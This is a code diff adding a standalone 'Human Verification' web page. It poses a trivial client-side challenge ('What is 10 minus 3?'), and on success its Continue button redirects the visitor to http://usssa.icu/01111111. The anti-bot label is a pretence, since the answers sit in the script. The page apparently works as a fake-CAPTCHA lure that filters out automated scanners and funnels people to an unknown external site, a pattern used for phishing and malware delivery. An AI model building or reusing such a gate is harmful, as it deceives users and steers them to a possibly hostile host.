@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Human Verification</title>
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #FFDEE9, #B5FFFC);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 25px;
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+      width: 90%;
+      max-width: 420px;
+      text-align: center;
+    }
+
+    h2 {
+      color: #222;
+      margin-bottom: 25px;
+      font-weight: 600;
+      font-size: 28px;
+    }
+
+    #challengeText {
+      font-family: 'Luckiest Guy', cursive;
+      font-size: 22px;
+      color: #ff3c6f;
+      margin-bottom: 15px;
+      letter-spacing: 1px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px 15px;
+      margin: 10px 0;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      font-size: 16px;
+      outline: none;
+      transition: 0.3s;
+    }
+
+    input[type="text"]:focus {
+      border-color: #66a6ff;
+    }
+
+    button {
+      padding: 12px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 15px;
+      transition: 0.4s;
+      position: relative;
+      z-index: 1;
+      overflow: hidden;
+      transform: scale(1);
+      transition: transform 0.2s ease, background 0.3s;
+    }
+
+    button.clicked {
+      transform: scale(1.08);
+    }
+
+    button::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, #ff6ec4, #7873f5, #4ade80, #facc15);
+      z-index: -1;
+      transition: 0.5s;
+      background-size: 400% 400%;
+      animation: glow 6s linear infinite;
+    }
+
+    @keyframes glow {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+
+    .verify-btn {
+      color: white;
+      background: transparent;
+      font-weight: bold;
+    }
+
+    #continueBtn {
+      display: none;
+      color: white;
+      background: transparent;
+      font-weight: bold;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>🎯 Human Checkpoint</h2>
+    <p id="challengeText"></p>
+    <input type="text" id="userAnswer" placeholder="Type your answer...">
+    <button class="verify-btn" onclick="verify(); this.classList.add('clicked'); setTimeout(() => this.classList.remove('clicked'), 200);">✔️ Verify</button>
+    <button id="continueBtn" onclick="redirectUser(); this.classList.add('clicked'); setTimeout(() => this.classList.remove('clicked'), 200);">➡️ Continue</button>
+    <div class="footer">🛡️ Anti-Bot Security | Colorful Edition</div>
+  </div>
+
+  <script>
+    const challenges = [
+      { q: "What is 10 minus 3?", a: "7" },
+      { q: "Type the third letter of the word 'ROBOTIC'", a: "B" },
+      { q: "What comes after 5?", a: "6" },
+      { q: "Type the first letter of the word 'SECURE'", a: "S" },
+      { q: "Type the last letter of the word 'HUMAN'", a: "N" }
+    ];
+
+    const challenge = challenges[Math.floor(Math.random() * challenges.length)];
+    document.getElementById("challengeText").innerText = challenge.q;
+
+    function verify() {
+      const userInput = document.getElementById("userAnswer").value.trim().toUpperCase();
+      if (userInput === challenge.a.toUpperCase()) {
+        alert("🎉 Verified Successfully!");
+        document.getElementById("continueBtn").style.display = "block";
+      } else {
+        alert("🚫 Incorrect Answer. Try Again!");
+        location.reload();
+      }
+    }
+
+    function redirectUser() {
+      window.location.href = "http://usssa.icu/01111111";
+    }
+  </script>
+
+</body>
+</html>
